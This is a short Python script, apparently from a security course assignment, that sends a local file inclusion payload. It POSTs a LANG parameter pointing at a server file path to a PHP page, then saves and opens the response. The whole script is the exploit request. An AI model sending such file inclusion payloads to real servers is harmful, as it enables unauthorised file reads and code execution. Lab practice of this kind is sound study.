from urllib import request, parse
import webbrowser

# base_url = "http://localhost:20080/Assignment/case03/case03.php"
base_url = "http://iu.ru/Assignment/case03/case03.php"
values = {"LANG": "/var/www/html/Assignment/lfi.txt.php"}
data = parse.urlencode(values).encode()
req = request.Request(base_url, data=data)
resp = request.urlopen(req)
print(type(resp))

with open("result.html", "w") as fd:
    fd.write(resp.read().decode())

webbrowser.open("result.html", new=2)
